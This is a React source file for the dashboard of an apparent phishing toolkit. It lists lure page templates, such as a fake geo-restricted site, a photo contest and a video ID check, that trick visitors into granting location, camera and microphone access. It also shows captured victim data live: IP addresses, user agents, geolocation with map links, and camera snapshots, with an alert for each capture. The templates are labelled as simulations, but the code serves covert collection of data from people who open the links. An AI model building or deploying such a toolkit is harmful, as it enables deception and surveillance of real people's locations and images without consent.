
"use client";
import { useEffect, useRef, useState } from 'react';
import { useLogs } from '@/contexts/LogContext';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { PhishingLinkCard } from '@/components/dashboard/PhishingLinkCard';
import { MapPin, Camera, Mic, Trash2, ListChecks, AlertTriangle, ExternalLink, Globe, Trophy, ImagePlus, Sparkles, Lock, ShieldAlert, Image as ImageIconLucide, Gamepad2 } from 'lucide-react'; // Added Gamepad2
import type { LogEntry, LocationData, CameraData } from '@/types';
import { ScrollArea } from '@/components/ui/scroll-area';
import Image from 'next/image';
import { useToast } from '@/hooks/use-toast';
import type { ToastActionElement } from '@/components/ui/toast';
import { ToastAction } from '@/components/ui/toast';
import { cn } from '@/lib/utils';


const phishingCategories = [
  {
    title: 'Location',
    description: 'Templates designed to capture IP address and attempt geolocation.',
    Icon: MapPin,
    links: [
      { id: 'restricted-website-access', name: 'Restricted Website Access', url: '/phishing/location/restricted-website-access', Icon: Globe, description: "Simulates a geo-blocked website requiring location to access content." },
      { id: 'geo-restricted-service-access', name: 'Geo-Restricted Service Access', url: '/phishing/location/geo-restricted-service-access', Icon: Gamepad2, description: "Simulates accessing a geo-restricted digital service (e.g., streaming, gaming)." },
      { id: 'content-unlock', name: 'Content Unlock', url: '/phishing/location/content-unlock', Icon: Lock, description: "Simulates unlocking region-restricted general content." },
    ],
  },
  {
    title: 'Camera Access',
    description: 'Templates attempting to access the device camera.',
    Icon: Camera,
    links: [
      { id: 'photo-contest-entry', name: 'Photo Contest Entry', url: '/phishing/camera/photo-contest-entry', Icon: Trophy, description: "Simulates a photo contest entry requiring camera access after cookie consent." },
      { id: 'video-verification', name: 'Video Verification', url: '/phishing/camera/video-verification', Icon: ImageIconLucide, description: "Simulates a video ID verification process." },
      { id: 'ar-filter', name: 'AR Filter Test', url: '/phishing/camera/ar-filter', Icon: Camera, description: "Simulates trying out an AR filter." },
    ],
  },
  {
    title: 'Audio Access',
    description: 'Templates simulating microphone access requests.',
    Icon: Mic,
    links: [
      { id: 'voice-assistant', name: 'Voice Assistant Setup', url: '/phishing/audio/voice-assistant', description: "Simulates setting up a voice assistant." },
      { id: 'speech-to-text', name: 'Speech-to-Text Demo', url: '/phishing/audio/speech-to-text', description: "Simulates a speech-to-text service." },
      { id: 'quality-check', name: 'Audio Quality Check', url: '/phishing/audio/quality-check', description: "Simulates a microphone quality check." },
    ],
  },
];

export default function DashboardPage() {
  const { logs, clearLogs, isLoading } = useLogs();
  const { toast } = useToast();
  const previousLatestLogIdRef = useRef<string | null>(null);
  const isInitialLoadRef = useRef(true);
  const [expandedImageUrl, setExpandedImageUrl] = useState<string | null>(null);
  const [isModalAnimating, setIsModalAnimating] = useState(false);

  const openModal = (url: string) => {
    setExpandedImageUrl(url);
    requestAnimationFrame(() => {
      setIsModalAnimating(true);
    });
  };

  const closeModal = () => {
    setIsModalAnimating(false);
    setTimeout(() => {
      setExpandedImageUrl(null);
    }, 300); 
  };


  useEffect(() => {
    if (isLoading) return;

    // Handle initial load state
    if (isInitialLoadRef.current) {
      if (logs.length > 0) {
        previousLatestLogIdRef.current = logs[0].id;
      } else {
        previousLatestLogIdRef.current = null;
      }
      isInitialLoadRef.current = false;
      return;
    }

    // After initial load, handle new logs
    if (logs.length === 0) {
        previousLatestLogIdRef.current = null; // Reset if all logs are cleared after initial load
        return;
    }
    
    const currentLatestLogId = logs[0].id;

    if (currentLatestLogId !== previousLatestLogIdRef.current) {
      const newLog = logs[0];
      let toastTitle = "New Data Captured!";
      let toastDescription = `Type: ${newLog.type}, IP: ${newLog.ip}`;
      let toastAction: ToastActionElement | undefined = undefined;

      if (newLog.type === 'location') {
        const locData = newLog.data as LocationData;
        const city = locData.city || "Unknown City";
        const country = locData.country || "Unknown Country";
        toastTitle = "Location Data Captured!";
        toastDescription = `From ${city}, ${country}. IP: ${newLog.ip}.`;
        if (locData.latitude && locData.longitude) {
          const mapsUrl = `https://www.google.com/maps?q=${locData.latitude},${locData.longitude}`;
          toastAction = (
            <ToastAction
              altText="Open in Maps"
              onClick={() => window.open(mapsUrl, '_blank')}
            >
              <ExternalLink className="mr-2 h-4 w-4" /> Open in Maps
            </ToastAction>
          );
        }
      } else if (newLog.type === 'camera') {
        toastTitle = "Camera Snapshot Captured!";
        toastDescription = `Image captured from IP: ${newLog.ip}.`;
      } else if (newLog.type === 'audio') {
        toastTitle = "Audio Capture Simulated!";
        toastDescription = `Audio event from IP: ${newLog.ip}.`;
      } else if (newLog.type === 'generic') {
        toastTitle = "Page Visit Detected!";
        toastDescription = `Page: ${newLog.data.message?.split(': ')[1] || 'Unknown page'}, IP: ${newLog.ip}`;
      }

      toast({
        title: toastTitle,
        description: toastDescription,
        variant: "default",
        action: toastAction,
      });
      previousLatestLogIdRef.current = currentLatestLogId;
    }
  }, [logs, isLoading, toast]);


  const formatLogData = (data: any, type: LogEntry['type']): React.ReactNode => {
    if (type === 'camera' && data && typeof data.imageUrl === 'string') {
      const camData = data as CameraData;
      return (
        <div className="mt-2">
          <Image
            src={camData.imageUrl}
            alt="Captured image thumbnail"
            width={160} 
            height={120}
            className="rounded-md border object-contain cursor-pointer hover:opacity-80 transition-opacity"
            onClick={() => openModal(camData.imageUrl)}
            style={{ aspectRatio: '4/3' }} 
          />
          <details className="text-xs mt-1">
            <summary className="cursor-pointer text-muted-foreground hover:text-foreground">Show Base64 Data (truncated)</summary>
            <pre className="whitespace-pre-wrap break-all text-xs bg-muted/30 p-2 rounded-sm mt-1">{JSON.stringify({ imageUrl: `${camData.imageUrl.substring(0,100)}...` }, null, 2)}</pre>
          </details>
        </div>
      );
    }
    if (type === 'location' && data) {
        const locData = data as LocationData;
        return <pre className="whitespace-pre-wrap break-all text-xs">{JSON.stringify(locData, null, 2)}</pre>;
    }
    return <pre className="whitespace-pre-wrap break-all text-xs">{JSON.stringify(data, null, 2)}</pre>;
  };

  return (
    <>
      <div className="space-y-10">
        <Card className="shadow-lg">
          <CardHeader>
            <CardTitle className="text-2xl flex items-center">
              <ListChecks className="mr-3 h-7 w-7 text-primary" />
              Captured Data Logs
            </CardTitle>
            <CardDescription>
              View all data captured from phishing page interactions. This data updates in real-time.
            </CardDescription>
          </CardHeader>
          <CardContent className="space-y-4">
            {isLoading ? (
              <p>Loading logs...</p>
            ) : logs.length === 0 ? (
              <div className="text-center py-8 text-muted-foreground">
                <AlertTriangle className="mx-auto h-12 w-12 mb-2" />
                <p className="text-lg">No logs captured yet.</p>
                <p>Interact with the phishing templates to see data here.</p>
              </div>
            ) : (
              <ScrollArea className="h-[400px] w-full rounded-md border p-4 bg-secondary/30">
                {logs.map(log => (
                  <div key={log.id} className="mb-4 p-3 rounded-md bg-card shadow-sm border">
                    <p className="font-semibold text-sm text-primary">Log ID: <span className="font-mono text-xs">{log.id}</span></p>
                    <p className="text-xs text-muted-foreground">Timestamp: {new Date(log.timestamp).toLocaleString()}</p>
                    <p className="text-xs text-muted-foreground">Type: <span className="font-medium capitalize">{log.type}</span></p>
                    <p className="text-xs text-muted-foreground">IP: {log.ip}</p>
                    <p className="text-xs text-muted-foreground">User Agent: {log.userAgent}</p>
                    <div className="mt-1 text-sm">Data: {formatLogData(log.data, log.type)}</div>
                  </div>
                ))}
              </ScrollArea>
            )}
            <Button onClick={clearLogs} variant="destructive" disabled={logs.length === 0}>
              <Trash2 className="mr-2 h-4 w-4" /> Delete All Logs
            </Button>
          </CardContent>
        </Card>

        <Card className="shadow-lg">
          <CardHeader>
            <CardTitle className="text-2xl">Phishing Page Templates</CardTitle>
            <CardDescription>
              Use these links to simulate phishing attempts and observe data capture. Each link opens in a new tab.
            </CardDescription>
          </CardHeader>
          <CardContent className="flex justify-center">
            <div className="inline-grid gap-6 md:grid-cols-1 lg:grid-cols-3">
              {phishingCategories.map((category) => (
                <PhishingLinkCard
                  key={category.title}
                  title={category.title}
                  description={category.description}
                  Icon={category.Icon}
                  links={category.links.map(link => ({
                    ...link,
                    description: link.description || "Generic template description.",
                    Icon: link.Icon || category.Icon
                  }))}
                />
              ))}
            </div>
          </CardContent>
        </Card>
      </div>

      {expandedImageUrl && (
        <div
          className={cn(
            "fixed inset-0 z-[101] flex items-center justify-center p-4 cursor-zoom-out",
            "transition-opacity duration-300 ease-in-out",
            isModalAnimating ? "opacity-100 bg-black/80" : "opacity-0 bg-black/0 pointer-events-none"
          )}
          onClick={closeModal}
        >
          <div
            className={cn(
              "transform transition-all duration-300 ease-in-out",
              isModalAnimating ? "opacity-100 scale-100" : "opacity-0 scale-95"
            )}
            onClick={(e) => e.stopPropagation()} 
          >
            <Image
              src={expandedImageUrl!}
              alt="Expanded captured image"
              width={0} 
              height={0}
              sizes="100vw"
              style={{ width: 'auto', height: 'auto' }} 
              className="max-w-[90vw] max-h-[90vh] object-contain rounded-lg shadow-xl bg-white p-1"
            />
          </div>
        </div>
      )}
    </>
  );
}
